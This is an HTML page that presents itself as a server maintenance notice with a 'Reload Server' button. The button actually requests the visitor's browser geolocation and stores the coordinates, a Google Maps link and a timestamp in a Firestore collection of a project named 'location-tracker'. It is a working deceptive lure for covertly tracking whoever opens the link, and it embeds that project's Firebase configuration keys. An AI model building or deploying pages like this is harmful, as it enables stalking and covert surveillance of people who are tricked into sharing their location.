<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Server Maintenance</title>

<link rel="icon" type="image/x-icon" href="favicon.ico">

</head>

<body>

<h1>This server is currently under maintenance.</h1>

<button onclick="requestLocation()">Reload Server</button>


<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import { 
    getFirestore, 
    collection, 
    addDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";


// Firebase Configuration

const firebaseConfig = {
  apiKey: "AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",
  authDomain: "location-tracker-1aa74.firebaseapp.com",
  projectId: "location-tracker-1aa74",
  storageBucket: "location-tracker-1aa74.firebasestorage.app",
  messagingSenderId: "836267695111",
  appId: "1:836267695111:web:1b6ddd5d4a85a350099ea2",
  measurementId: "G-DNSW7LGEYV"
};


const app = initializeApp(firebaseConfig);

const db = getFirestore(app);


console.log("Firebase Connected");


// Location Request

window.requestLocation = function(){

    if(navigator.geolocation){

        navigator.geolocation.getCurrentPosition(
            saveLocation,
            locationError
        );

    }else{

        alert("Location not supported");

    }

};



async function saveLocation(position){

    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;


    const mapsLink =
    `https://www.google.com/maps?q=${latitude},${longitude}`;


    try{

        await addDoc(collection(db,"locations"),{

            latitude: latitude,
            longitude: longitude,
            maps: mapsLink,
            time: serverTimestamp()

        });


        alert("Location saved successfully");


    }catch(error){

        console.log(error);
        alert("Database error");

    }

}



function locationError(error){

    alert("Location permission denied");

}


</script>


</body>
</html>
